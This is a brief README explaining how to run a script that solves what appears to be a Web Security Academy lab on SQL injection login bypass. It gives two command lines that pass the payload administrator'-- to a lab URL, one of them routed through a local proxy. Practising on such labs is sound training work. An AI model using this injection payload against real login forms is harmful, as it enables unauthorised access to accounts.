# How to run script.py

### SQL injection vulnerability allowing login bypass

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "administrator'--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "administrator'--" -p 127.0.0.1:8080`
